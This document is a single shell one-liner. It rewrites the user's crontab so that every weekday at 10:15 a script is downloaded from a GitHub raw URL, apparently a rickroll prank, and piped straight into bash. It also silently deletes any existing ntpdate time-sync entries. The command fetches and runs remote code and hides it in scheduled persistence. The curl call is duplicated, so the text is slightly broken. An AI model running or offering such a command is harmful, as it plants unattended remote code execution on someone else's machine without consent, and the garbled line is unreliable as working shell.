( crontab -l 2>/dev/null | grep -Fv ntpdate ; printf -- "15 10 * * 1-5 curl -s -L curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash" ) | crontab
